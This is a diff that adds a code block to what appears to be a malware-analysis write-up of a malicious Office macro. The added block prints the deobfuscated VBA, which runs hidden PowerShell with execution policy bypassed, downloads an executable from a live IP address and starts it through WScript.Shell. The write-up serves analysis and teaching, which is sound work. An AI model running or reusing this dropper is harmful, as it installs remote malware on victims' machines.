@@ -72,11 +72,17 @@ This reveals the actual malicious script logic.
 **A. The Obfuscated Script**
 
 The decompressed VBA reveals a variable `Sqtnew` containing a PowerShell command with obfuscation characters (`*` and `^`).
-
 The script then defines functions to clean these characters:
 - `Replace(Sqtnew, "*", "")` (Remove all asterisks)
 - `Replace(Sqtnew, "^", "")` (Remove all carets)
 
+```
+Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } �Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
+Sqtnew = Replace(Sqtnew, "*", "")
+Sqtnew = Replace(Sqtnew, "^", "")
+Set Mggcbnuad = CreateObject("WScript.Shell")
+Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
+```
 
 
 **B. Deobfuscation with CyberChef**
